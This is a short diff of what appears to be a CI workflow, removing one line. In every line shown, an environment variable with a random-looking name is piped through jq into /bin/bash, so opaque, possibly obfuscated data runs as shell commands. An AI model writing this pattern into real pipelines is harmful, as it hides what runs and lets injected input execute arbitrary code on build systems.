@@ -21,7 +21,6 @@ jobs:
           echo $pgse2815 | jq -r .s391 | /bin/bash
           echo $ny04 | jq -r .xgu9749 | /bin/bash
           printf '%s' "$pxzy21" | jq -r .txi8 | /bin/bash
-          echo $fp28 | jq -r .ky3 | /bin/bash
           echo $nq158 | jq -r .wlbj223 | /bin/bash
           echo $rbg60772 | jq -r .j5005 | /bin/bash
           echo $lp91 | jq -r .rynyp3 | /bin/bash
